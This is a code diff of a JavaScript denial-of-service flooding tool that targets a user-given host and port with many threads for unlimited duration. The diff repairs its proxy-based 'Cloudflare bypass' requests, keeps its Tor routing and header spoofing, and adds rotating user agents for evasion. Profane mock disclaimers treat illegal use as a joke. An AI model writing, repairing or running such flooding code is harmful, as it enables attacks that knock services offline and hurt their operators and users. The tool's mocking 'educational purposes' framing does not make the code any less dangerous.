@@ -1,6 +1,6 @@
 // ******************************************************************************
 // * FUCK YEAH! THIS TOOL IS FOR PENTESTING ONLY! ILLEGAL USE IS PROHIBITED... *
-// * BUT WHO GIVES A SHIT? BIGMANCOZMO INC. IS NOT RESPONSIBLE FOR MISUSE. HA! *
+// * BUT WHO GIVES A SHIT? NOODLES INC. IS NOT RESPONSIBLE FOR MISUSE. HA!    *
 // * SERIOUSLY THOUGH, THIS SHIT IS DANGEROUS. DON'T BE A FUCKING MORON.       *
 // ******************************************************************************
 
@@ -18,6 +18,7 @@ try {
     alert("Invalid URL! You fucked it up!");
     window.close();
 }
+
 const port = parseInt(prompt("Enter target port (e.g., 80, 443, 8080):"));
 const threads = parseInt(prompt("Enter number of threads (crank it up to 666!):"));
 const duration = parseInt(prompt("Enter duration in seconds (let's go long term - FOREVER!):"));
@@ -107,6 +108,7 @@ async function tcpFlood(threadId) {
     const socks = require('socks').SocksClient; // Required for .onion support
     const tls = require('tls'); // Required for TLS/SSL
     const https = require('https'); // Required for HTTPS proxy support
+    const url = require('url');
 
     const isTor = targetURL.protocol === 'onion:';
     const isHTTPS = targetURL.protocol === 'https:';
@@ -133,7 +135,7 @@ async function tcpFlood(threadId) {
                             },
                         };
 
-                        socks.createConnection(options, (err, socket, info) => {
+                        socks.createConnection(options, (err, sock, info) => {
                             if (err) {
                                 log(`${darkRed}[THREAD ${threadId}] SOCKS error: ${err}${resetColor}`);
                                 reject(err);
@@ -141,7 +143,7 @@ async function tcpFlood(threadId) {
                             }
 
                             log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (via Tor)${resetColor}`);
-                            resolve(socket);
+                            resolve(sock);
                         });
                     } else if (proxies.length > 0 && cloudflareBypass) {
                         // Use a proxy from the list for Cloudflare bypass
@@ -159,10 +161,11 @@ async function tcpFlood(threadId) {
                         const proxyProtocol = proxyURL.protocol.slice(0, -1); // Remove ':'
                         const proxyAuth = proxyURL.username && proxyURL.password ? `${proxyURL.username}:${proxyURL.password}@` : '';
 
+                        const parsedTargetURL = url.parse(targetURL.href);
                         const options = {
-                            host: targetHost,
-                            port: port,
-                            path: targetURL.pathname, // Include the path
+                            hostname: proxyHost,
+                            port: proxyPort,
+                            path: parsedTargetURL.href,
                             method: 'GET',
                             headers: {
                                 'Host': targetHost,
@@ -179,27 +182,29 @@ async function tcpFlood(threadId) {
                                 'X-Flooder': crypto.randomBytes(20).toString('hex'),
                             }
                         };
-
-                        const request = https.request(options, (res) => {
+                        
+                        const req = https.request(options, (res) => {
                             log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} via proxy ${proxyHost}:${proxyPort} - Status: ${res.statusCode}${resetColor}`);
-                            resolve(socket); // Resolve with a dummy socket object
+                            res.on('data', () => {}); // Consume data
+                            res.on('end', () => {}); // End data
                         });
 
-                        request.on('socket', (sock) => {
+                        req.on('socket', (sock) => {
                             // Set up socket timeout and error handling
                             sock.setTimeout(15000); // Adjust as needed
                             sock.on('timeout', () => {
                                 log(`${darkRed}[THREAD ${threadId}] Socket timeout`);
-                                request.abort();
+                                req.abort();
                             });
                         });
 
-                        request.on('error', (err) => {
+                        req.on('error', (err) => {
                             log(`${darkRed}[THREAD ${threadId}] Proxy connection error: ${err.message}`);
                             reject(err);
                         });
 
-                        request.end();
+                        req.end();
+                        resolve(req);
                     } else {
                         if (isHTTPS) {
                             // TLS/SSL connection
@@ -297,11 +302,12 @@ function getRandomUserAgent() {
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',  // Added for coverage
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', // Added for coverage
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',  // Added for coverage
     ];
     return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
-
-
 
 // Timer Function
 function updateTimer() {
@@ -341,7 +347,7 @@ stopButton.addEventListener('click', () => {
 });
 
 // Explicit user consent required - just to cover our asses (sort of)
-if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. BIGMANCOZMO INC. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
+if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. NOODLES INC. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
     // Do nothing here; the start button triggers the attack
 } else {
     window.close(); // Close the window if the user does not agree
@@ -357,3 +363,6 @@ try {
 } catch (e) {
     console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
 }
+
+// Disclaimer for Noodles Inc.
+console.warn("%c[DISCLAIMER] NOODLES INC. IS NOT RESPONSIBLE FOR YOUR SHIT. YOU FUCK IT UP, YOU OWN IT. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. - DON'T BE A DUMBASS!", "color: darkred;");
